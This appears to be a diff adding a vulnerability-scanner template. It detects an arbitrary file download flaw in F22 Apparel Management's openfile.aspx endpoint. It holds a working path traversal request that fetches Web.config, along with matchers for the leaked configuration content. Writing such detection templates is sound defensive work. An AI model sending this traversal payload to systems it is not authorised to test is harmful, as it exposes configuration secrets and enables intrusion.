@@ -1,0 +1,28 @@
+id: f22-apparel-management-openfile-anyfile-download
+info:
+  name: F22 Apparel Management openfile.aspx Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects arbitrary file download vulnerability in F22 Apparel Management Software's openfile.aspx endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/oa/isprit/module/openfile.aspx?Url=..\\..\\..\\Web.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version"
+          - "<configuration>"
+          - "<appSettings>"
+          - "</system.web>"
+        part: body
+      - type: word
+        words:
+          - "application/x-config"
+        part: header
